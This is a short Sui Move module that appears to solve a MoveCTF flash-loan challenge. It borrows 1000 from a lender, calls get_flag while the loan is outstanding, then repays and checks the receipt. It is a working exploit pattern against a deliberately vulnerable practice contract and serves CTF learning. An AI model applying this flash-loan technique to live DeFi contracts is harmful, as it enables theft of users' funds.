module 0x0::flash_loan {
    use movectf::flash::{Self, FlashLender};
    use sui::tx_context::TxContext;

    public entry fun catch_flag(
        flash_lender: &mut FlashLender,
        ctx: &mut TxContext
    ) {
        let to_lend = 1000;
        let (coins, receipt) = flash::loan(flash_lender, to_lend, ctx);
        flash::get_flag(flash_lender, ctx);
        flash::repay(flash_lender, coins);
        flash::check(flash_lender, receipt);
    }
}